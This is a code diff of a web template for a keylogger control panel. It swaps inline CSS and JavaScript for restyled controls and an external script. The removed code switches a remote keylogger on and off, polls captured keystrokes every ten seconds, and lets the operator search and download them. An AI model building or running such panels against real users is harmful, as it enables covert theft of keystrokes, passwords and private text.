@@ -6,189 +6,65 @@
     <pre>{{ keylog_data }}</pre>
 </div>
 
-<style>
-    body {
-        font-family: Arial, sans-serif;
-        margin: 20px;
-    }
-    .highlight {
-        background-color: yellow;
-    }
-    pre#textDisplay {
-        width: 100%;
-        height: 300px;
-        overflow-y: auto;
-        background: #2c2c2c;
-        padding: 10px;
-        white-space: pre-wrap;
-        border-radius: 8px;
-        margin-top: 10px;
-        border: 1px solid rgba(0,0,0,0.5);
-        box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.5);
-    }
-</style>
+<!-- Controls -->
+<span class="flex-row" id="main-klg-div">
+    <div class="status-card flex-col" id="left-col">
+        <label id="fetchLabel">
+            <span id="send-mode-span">
+                <p>State:</p>
+                <div class="toggle-container on-off-slider">
+                    <span class="toggle-label toggle-left">OFF</span>
+                    <label class="switch">
+                        <input 
+                            type="checkbox" 
+                            id="channelToggle" 
+                            {% if klg_on %}checked{% endif %}
+                        >
+                        <span class="slider round"></span>
+                    </label>
+                    <span class="toggle-label toggle-right">ON</span>
+                    <input type="hidden" id="channelInput" name="channel" value="OFF">
+                </div>
+            </span>
+        </label>
+        <button type="button" onclick="fetchKeyloggerData()" id="fetch-button">
+            <p class="loader-btn">🗘</p>
+            <p id="loader-btn-text">Fetch data</p>
+        </button>
+    </div>
 
-<label id="fetchLabel">
-    <input type="checkbox" id="toggleFetch"> Enable keylogger
-</label>
+    <div class="status-card flex-col" id="right-col">
+        <input type="text" id="searchInput" placeholder="Search...">
+        <label>
+            <label id="regexLabel">
+                <span id="regex-mode-span">
+                    <div class="toggle-container">
+                        <span class="toggle-label toggle-left">Normal</span>
+                        <label class="switch">
+                            <input 
+                                type="checkbox" 
+                                id="regexToggle" 
+                            >
+                            <span class="slider round"></span>
+                        </label>
+                        <span class="toggle-label toggle-right">RegEx</span>
+                        <input type="hidden" id="regexInput" name="regex" value="Normal">
+                    </div>
+                    <button onclick="updateSearchResults()" id="klg-search-btn">Search</button>
+                </span>
+            </label>
+        </label>
+    </div>
 
-<div style="margin-top: 10px;">
-    <input type="text" id="searchInput" placeholder="Search...">
-    <label>
-        <input type="checkbox" id="regexToggle"> Use RegEx
-    </label>
-    <span id="matchCount" style="margin-left: 10px; font-weight: bold;"></span>
-    <button onclick="searchText()">Search</button>
+</span>
+
+<div class="status-card" id="klg-results-block">
+    <pre id="textDisplay" readonly></pre>
+    <button style="margin-top: 10px;" onclick="downloadText()">Download as .txt</button>
 </div>
 
-<pre id="textDisplay" readonly></pre>
 
-<button style="margin-top: 10px;" onclick="downloadText()">Download as .txt</button>
-
-<script>
-    const toggleFetch = document.getElementById('toggleFetch');
-    const label = document.getElementById('fetchLabel');
-    const textDisplay = document.getElementById('textDisplay');
-    const searchInput = document.getElementById('searchInput');
-    const regexToggle = document.getElementById('regexToggle');
-    const matchCount = document.getElementById('matchCount');
-
-    let intervalId = null;
-    let countdownIntervalId = null;
-    const fetchIntervalSeconds = 10;
-    let countdown = fetchIntervalSeconds;
-    let originalText = "";
-
-    toggleFetch.checked = {{ 'true' if klg_on else 'false' }};
-
-    document.addEventListener('DOMContentLoaded', () => {
-        if (!regexToggle.checked) {
-            searchInput.addEventListener('input', searchText);
-        }
-
-        regexToggle.addEventListener('change', () => {
-            if (regexToggle.checked) {
-                searchInput.removeEventListener('input', searchText);
-            } else {
-                searchInput.addEventListener('input', searchText);
-            }
-        });
-
-        if (toggleFetch.checked) {
-            startFetching();
-        }
-    });
-
-    toggleFetch.addEventListener('change', async () => {
-        if (toggleFetch.checked) {
-            await startFetching();
-        } else {
-            await stopFetching();
-        }
-    });
-
-    async function startFetching() {
-        try {
-            await fetch("{{ url_for('klgon_command') }}", { method: 'POST' });
-
-            countdown = fetchIntervalSeconds;
-            updateLabel();
-
-            await fetchKeyLoggerData(); // fetch immédiat
-
-            intervalId = setInterval(async () => {
-                await fetchKeyLoggerData();
-                countdown = fetchIntervalSeconds;
-            }, fetchIntervalSeconds * 1000);
-
-            countdownIntervalId = setInterval(() => {
-                countdown--;
-                if (countdown <= 0) countdown = fetchIntervalSeconds;
-                updateLabel();
-            }, 1000);
-        } catch (err) {
-            console.error('Start fetch error:', err);
-        }
-    }
-
-    async function stopFetching() {
-        try {
-            await fetch("{{ url_for('klgoff_command') }}", { method: 'POST' });
-            clearInterval(intervalId);
-            clearInterval(countdownIntervalId);
-            intervalId = null;
-            countdownIntervalId = null;
-            label.innerHTML = '';
-            label.appendChild(toggleFetch);
-            label.appendChild(document.createTextNode(' Enable keylogger'));
-        } catch (err) {
-            console.error('Stop fetch error:', err);
-        }
-    }
-
-    async function fetchKeyLoggerData() {
-        try {
-            const response = await fetch("{{ url_for('klg_command') }}");
-            if (!response.ok) throw new Error('Network Error');
-            const text = await response.json();
-            originalText = text;
-            if ( !regexToggle.checked ) {
-                searchText();
-            }
-        } catch (err) {
-            console.error('Fetch Error:', err);
-        }
-    }
-
-    function updateLabel() {
-        label.innerHTML = '';
-        label.appendChild(toggleFetch);
-        label.appendChild(document.createTextNode(` Enable keylogger (fetching in ${countdown}s)`));
-    }
-
-    function downloadText() {
-        const blob = new Blob([textDisplay.textContent], { type: 'text/plain' });
-        const link = document.createElement('a');
-        link.href = URL.createObjectURL(blob);
-        link.download = 'content.txt';
-        link.click();
-    }
-
-    function searchText() {
-        const query = searchInput.value.trim();
-        const useRegex = regexToggle.checked;
-
-        if (query === "") {
-            textDisplay.innerText = originalText;
-            matchCount.textContent = "";
-            return;
-        }
-
-        let regex;
-        try {
-            regex = useRegex ? new RegExp(query, 'gi') : new RegExp(escapeRegex(query), 'gi');
-        } catch (e) {
-            alert("Invalid Regular Expression");
-            matchCount.textContent = "";
-            return;
-        }
-
-        const lines = originalText.split('\n');
-        let matchCounter = 0;
-        const highlighted = lines.filter(line => {
-            return regex.test(line);
-        }).map(line => {
-            matchCounter++;
-            return line.replace(regex, match => `<span class="highlight">${match}</span>`);
-        });
-
-        matchCount.textContent = `${matchCounter} result${matchCounter === 1 ? '' : 's'}`;
-        textDisplay.innerHTML = highlighted.join('\n');
-    }
-
-    function escapeRegex(string) {
-        return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-    }
-</script>
+<!-- Scripts -->
+<script src="{{ url_for('static', filename='js/keylogger.js') }}"></script>
 
 {% endblock %}
